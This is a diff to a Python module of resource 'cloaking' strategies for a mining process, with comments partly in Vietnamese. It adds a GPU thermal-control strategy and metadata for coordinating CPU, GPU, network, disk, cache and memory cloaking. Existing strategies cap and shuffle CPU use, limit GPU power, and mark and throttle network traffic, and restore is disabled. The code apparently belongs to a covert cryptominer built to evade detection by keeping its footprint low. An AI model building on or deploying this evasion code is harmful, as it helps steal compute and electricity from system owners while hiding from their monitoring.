@@ -37,8 +37,8 @@ else:
 
 class StrategyType:
     """
-    Các loại chiến lược cloaking theo blueprint redesign.
-    6 unified strategies: CPU, GPU, Network, Disk I/O, Cache, Memory
+    ✅ ENHANCED: Các loại chiến lược cloaking cho comprehensive resource control.
+    7 unified strategies: CPU, GPU, Network, Disk I/O, Cache, Memory, Thermal Control
     """
     CPU = "cpu"
     GPU = "gpu"
@@ -46,6 +46,7 @@ class StrategyType:
     DISK_IO = "disk_io"
     CACHE = "cache"
     MEMORY = "memory"
+    THERMAL_CONTROL = "thermal_control"  # ✅ NEW: Advanced thermal management
 
 ###############################################################################
 #                           CƠ SỞ CỦA CÁC STRATEGY                            #
@@ -53,14 +54,25 @@ class StrategyType:
 
 class CloakStrategy(ABC):
     """
-    Lớp cơ sở trừu tượng cho chiến lược cloaking.
-    Redesigned theo blueprint với strategy_type và requires_plugin_system attributes.
+    ✅ ENHANCED: Lớp cơ sở trừu tượng cho comprehensive multi-strategy cloaking.
+    Redesigned cho comprehensive resource cloaking với advanced coordination.
     """
 
     logger: logging.Logger  # thêm attribute để linter biết
     privileged_manager: Optional[Any] = None  # Để inject privileged operations
     strategy_type: str = ""  # Loại chiến lược (CPU, GPU, Network, ...)
     requires_plugin_system: bool = False  # Có yêu cầu plugin system không
+    
+    # ✅ NEW: Comprehensive cloaking attributes
+    is_primary_strategy: bool = False  # Có phải primary strategy không
+    coordination_priority: int = 50  # Priority for multi-strategy coordination (0-100)
+    resource_conflicts: List[str] = []  # List of resource types that may conflict
+    depends_on_strategies: List[str] = []  # Strategies this one depends on
+    
+    # ✅ NEW: Performance and compatibility attributes
+    supports_concurrent_application: bool = True  # Có thể apply cùng lúc với strategies khác
+    estimated_application_time_ms: int = 100  # Estimated time to apply strategy
+    compatibility_matrix: Dict[str, str] = {}  # Compatibility với other strategies
 
     def set_privileged_manager(self, privileged_manager: Any) -> None:
         """
@@ -91,23 +103,92 @@ class CloakStrategy(ABC):
         self.logger.info(f"[RESTORE DISABLED] Restore request for PID={process.pid} bị bỏ qua - chế độ chỉ cloaking.")
         pass
 
+    # ✅ NEW: Comprehensive cloaking support methods
+    def pre_apply_check(self, process: MiningProcess) -> bool:
+        """
+        ✅ NEW: Pre-application compatibility check cho comprehensive cloaking.
+        
+        :param process: Đối tượng MiningProcess để check compatibility
+        :return: True nếu strategy có thể áp dụng an toàn
+        """
+        try:
+            # Base implementation - các subclasses có thể override
+            return True
+        except Exception as e:
+            if hasattr(self, 'logger'):
+                self.logger.debug(f"Pre-apply check failed for {self.__class__.__name__}: {e}")
+            return False
+
+    def post_apply_verification(self, process: MiningProcess) -> bool:
+        """
+        ✅ NEW: Post-application verification cho comprehensive cloaking.
+        
+        :param process: Đối tượng MiningProcess để verify
+        :return: True nếu strategy đã được áp dụng thành công
+        """
+        try:
+            # Base implementation - các subclasses có thể override
+            return True
+        except Exception as e:
+            if hasattr(self, 'logger'):
+                self.logger.debug(f"Post-apply verification failed for {self.__class__.__name__}: {e}")
+            return False
+
+    def check_resource_conflicts(self, other_strategies: List[str]) -> List[str]:
+        """
+        ✅ NEW: Check potential resource conflicts với other strategies.
+        
+        :param other_strategies: List of strategy names đang được áp dụng
+        :return: List of potential conflicts
+        """
+        conflicts = []
+        for strategy in other_strategies:
+            if strategy in self.resource_conflicts:
+                conflicts.append(strategy)
+        return conflicts
+
+    def get_strategy_metadata(self) -> Dict[str, Any]:
+        """
+        ✅ NEW: Get metadata về strategy cho comprehensive coordination.
+        
+        :return: Dictionary chứa strategy metadata
+        """
+        return {
+            'strategy_type': self.strategy_type,
+            'is_primary': self.is_primary_strategy,
+            'priority': self.coordination_priority,
+            'conflicts': self.resource_conflicts,
+            'dependencies': self.depends_on_strategies,
+            'concurrent_safe': self.supports_concurrent_application,
+            'estimated_time_ms': self.estimated_application_time_ms,
+            'compatibility': self.compatibility_matrix
+        }
+
 ###############################################################################
 #                 CPU STRATEGY: CpuCloakStrategy                              #
 ###############################################################################
 
 class CpuCloakStrategy(CloakStrategy):
     """
-    Chiến lược cloaking CPU đồng bộ:
+    ✅ ENHANCED: Chiến lược cloaking CPU cho comprehensive multi-strategy environment:
       - Giới hạn CPU bằng cgroup,
       - Tối ưu cache CPU (tuỳ ý),
       - Đặt affinity,
       - Chuyển đổi giữa core chẵn/lẻ theo định kỳ (có thể random hoá khoảng thời gian).
     
-    Redesigned theo blueprint với plugin system delegation.
+    Enhanced cho comprehensive cloaking với advanced coordination.
     """
 
     strategy_type = StrategyType.CPU
     requires_plugin_system = True  # CPU strategies require plugin system
+    
+    # ✅ NEW: Comprehensive cloaking attributes
+    is_primary_strategy = True  # CPU cloaking is PRIMARY for CPU processes
+    coordination_priority = 100  # Highest priority for CPU processes
+    resource_conflicts = ['memory']  # May conflict with memory strategy on cgroup resources
+    depends_on_strategies = []  # No dependencies
+    supports_concurrent_application = True  # Safe to apply with other strategies
+    estimated_application_time_ms = 500  # CPU cgroup setup takes ~500ms
 
     def __init__(
         self,
@@ -1099,15 +1180,23 @@ class CpuCloakStrategy(CloakStrategy):
 
 class GpuCloakStrategy(CloakStrategy):
     """
-    Chiến lược cloaking GPU đồng bộ:
+    ✅ ENHANCED: Chiến lược cloaking GPU cho comprehensive multi-strategy environment:
       - Giới hạn power limit,
       - Set xung nhịp,
       - (Tuỳ chọn) limit_temperature => hạ xung nhịp nếu GPU nóng.
     
-    Redesigned theo blueprint với plugin system delegation.
+    Enhanced cho comprehensive cloaking với thermal coordination.
     """
     
     strategy_type = StrategyType.GPU
+    
+    # ✅ NEW: Comprehensive cloaking attributes
+    is_primary_strategy = True  # GPU cloaking is PRIMARY for GPU processes
+    coordination_priority = 100  # Highest priority for GPU processes
+    resource_conflicts = ['thermal_control']  # Conflicts with separate thermal management
+    depends_on_strategies = []  # No dependencies, but coordinates with thermal
+    supports_concurrent_application = True  # Safe to apply with other strategies
+    estimated_application_time_ms = 300  # GPU control via NVML ~300ms
     requires_plugin_system = True  # GPU strategies require plugin system
 
     def __init__(
@@ -1262,15 +1351,23 @@ class GpuCloakStrategy(CloakStrategy):
 
 class NetworkCloakStrategy(CloakStrategy):
     """
-    Cloaking mạng (đồng bộ):
+    ✅ ENHANCED: Cloaking mạng cho comprehensive multi-strategy environment:
       - Đánh dấu pid bằng iptables,
       - Giới hạn băng thông (tc).
     
-    Redesigned theo blueprint với direct execution.
+    Enhanced cho comprehensive cloaking với network isolation.
     """
     
     strategy_type = StrategyType.NETWORK
     requires_plugin_system = False  # Network strategies execute directly
+    
+    # ✅ NEW: Comprehensive cloaking attributes
+    is_primary_strategy = False  # Network is SECONDARY strategy
+    coordination_priority = 70  # Medium-high priority
+    resource_conflicts = []  # No direct conflicts with other strategies
+    depends_on_strategies = []  # Independent of other strategies
+    supports_concurrent_application = True  # Safe to apply with any other strategy
+    estimated_application_time_ms = 200  # iptables + tc commands ~200ms
 
     def __init__(
         self,
@@ -1546,6 +1643,151 @@ class MemoryCloakStrategy(CloakStrategy):
         Khôi phục Memory - CHÚ Ý: Tính năng restore đã bị vô hiệu hóa trong phiên bản này.
         """
         self.logger.info(f"[MEMORY RESTORE DISABLED] Restore request for PID={process.pid} bị bỏ qua - chế độ chỉ cloaking.")
+
+###############################################################################
+#           THERMAL CONTROL STRATEGY: ThermalControlStrategy                  #
+###############################################################################
+
+class ThermalControlStrategy(CloakStrategy):
+    """
+    ✅ NEW: Advanced thermal control strategy cho comprehensive GPU cloaking.
+    Provides independent thermal management separate from GPU cloaking.
+    """
+    
+    strategy_type = StrategyType.THERMAL_CONTROL
+    requires_plugin_system = False  # Direct NVML access
+    
+    # ✅ NEW: Comprehensive cloaking attributes
+    is_primary_strategy = False  # Thermal is SECONDARY/SPECIALIZED strategy
+    coordination_priority = 60  # Medium priority
+    resource_conflicts = ['gpu_cloaking']  # May conflict with GPU strategy thermal settings
+    depends_on_strategies = ['gpu_cloaking']  # Should apply after GPU cloaking
+    supports_concurrent_application = False  # May conflict with GPU thermal settings
+    estimated_application_time_ms = 150  # Thermal monitoring setup ~150ms
+
+    def __init__(
+        self,
+        config: Dict[str, Any],
+        logger: logging.Logger,
+        gpu_resource_manager: GPUResourceManager
+    ):
+        """
+        ✅ NEW: Khởi tạo ThermalControlStrategy cho advanced GPU thermal management.
+        """
+        self.logger = logger
+        self.config = config
+        self.gpu_resource_manager = cast(Any, gpu_resource_manager)
+
+        # Thermal thresholds
+        self.gpu_temp_threshold = config.get('gpu_temp_threshold', 75)  # °C
+        self.cpu_temp_threshold = config.get('cpu_temp_threshold', 80)  # °C
+        self.aggressive_cooling = config.get('aggressive_cooling', False)
+        
+        # Thermal response actions
+        self.thermal_throttle_step = config.get('thermal_throttle_step', 10)  # % reduction
+        self.emergency_shutdown_temp = config.get('emergency_shutdown_temp', 90)  # °C
+
+    def apply(self, process: MiningProcess) -> None:
+        """
+        ✅ NEW: Áp dụng advanced thermal control cho mining process.
+        
+        :param process: Đối tượng MiningProcess.
+        """
+        try:
+            pid, name = process.pid, process.name
+            
+            # Check if GPU resource manager is available
+            if not hasattr(self.gpu_resource_manager, 'get_gpu_count'):
+                self.logger.warning(f"[Thermal Control] GPU resource manager not available for PID={pid}")
+                return
+                
+            gpu_count = self.gpu_resource_manager.get_gpu_count()
+            if gpu_count == 0:
+                self.logger.debug(f"[Thermal Control] No GPUs detected for PID={pid}")
+                return
+
+            self.logger.info(f"🌡️ [Thermal Control] Applying thermal monitoring for {name} (PID={pid})")
+            
+            # Apply thermal monitoring for each GPU
+            for gpu_index in range(gpu_count):
+                try:
+                    current_temp = self.gpu_resource_manager.get_gpu_temperature(gpu_index)
+                    if current_temp is None:
+                        continue
+                        
+                    self.logger.info(f"🌡️ [Thermal] GPU {gpu_index} temperature: {current_temp}°C (threshold: {self.gpu_temp_threshold}°C)")
+                    
+                    # Apply thermal responses based on temperature
+                    if current_temp >= self.emergency_shutdown_temp:
+                        self.logger.error(f"🚨 [Thermal EMERGENCY] GPU {gpu_index} temperature {current_temp}°C >= {self.emergency_shutdown_temp}°C")
+                        # Emergency thermal protection
+                        self._apply_emergency_thermal_protection(gpu_index, pid)
+                        
+                    elif current_temp >= self.gpu_temp_threshold:
+                        self.logger.warning(f"⚠️ [Thermal] GPU {gpu_index} temperature {current_temp}°C >= {self.gpu_temp_threshold}°C")
+                        # Progressive thermal throttling
+                        self._apply_thermal_throttling(gpu_index, current_temp, pid)
+                        
+                    else:
+                        self.logger.debug(f"✅ [Thermal] GPU {gpu_index} temperature normal: {current_temp}°C")
+                        
+                except Exception as gpu_error:
+                    self.logger.error(f"❌ [Thermal] Error processing GPU {gpu_index}: {gpu_error}")
+
+            self.logger.info(f"✅ [Thermal Control] Applied thermal monitoring for {name} (PID={pid})")
+            
+        except psutil.NoSuchProcess as e:
+            self.logger.error(f"Thermal Control: Tiến trình không tồn tại: {e}")
+        except psutil.AccessDenied as e:
+            self.logger.error(f"Thermal Control: Không đủ quyền cho PID={process.pid}: {e}")
+        except Exception as e:
+            self.logger.error(
+                f"Lỗi Thermal Control cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
+            )
+
+    def _apply_thermal_throttling(self, gpu_index: int, current_temp: float, pid: int) -> None:
+        """Apply progressive thermal throttling based on temperature"""
+        try:
+            # Calculate throttling intensity based on temperature overshoot
+            temp_overshoot = current_temp - self.gpu_temp_threshold
+            throttle_intensity = min(50, int(temp_overshoot * 2))  # Max 50% throttling
+            
+            # Apply power limit reduction
+            current_power = self.gpu_resource_manager.get_gpu_power_limit(gpu_index)
+            if current_power:
+                reduced_power = int(current_power * (100 - throttle_intensity) / 100)
+                success = self.gpu_resource_manager.set_gpu_power_limit(pid, gpu_index, reduced_power)
+                
+                if success:
+                    self.logger.info(f"🌡️ [Thermal Throttle] GPU {gpu_index}: {current_power}W → {reduced_power}W ({throttle_intensity}% reduction)")
+                else:
+                    self.logger.error(f"❌ [Thermal Throttle] Failed to reduce power for GPU {gpu_index}")
+                    
+        except Exception as e:
+            self.logger.error(f"❌ [Thermal Throttle] Error throttling GPU {gpu_index}: {e}")
+
+    def _apply_emergency_thermal_protection(self, gpu_index: int, pid: int) -> None:
+        """Apply emergency thermal protection measures"""
+        try:
+            self.logger.error(f"🚨 [EMERGENCY THERMAL] Applying emergency protection for GPU {gpu_index}")
+            
+            # Reduce power to minimum safe level
+            min_power_limit = 100  # Minimum safe power limit
+            success = self.gpu_resource_manager.set_gpu_power_limit(pid, gpu_index, min_power_limit)
+            
+            if success:
+                self.logger.error(f"🚨 [EMERGENCY] GPU {gpu_index} power reduced to {min_power_limit}W")
+            else:
+                self.logger.error(f"💀 [EMERGENCY] Failed to apply emergency power reduction for GPU {gpu_index}")
+                
+        except Exception as e:
+            self.logger.error(f"💀 [EMERGENCY] Error applying emergency protection for GPU {gpu_index}: {e}")
+
+    def restore(self, process: MiningProcess) -> None:
+        """
+        Khôi phục Thermal Control - CHÚ Ý: Tính năng restore đã bị vô hiệu hóa trong phiên bản này.
+        """
+        self.logger.info(f"[THERMAL RESTORE DISABLED] Restore request for PID={process.pid} bị bỏ qua - chế độ chỉ cloaking.")
 
 ###############################################################################
 #                    DEPRECATED: CloakStrategyFactory REMOVED                 #
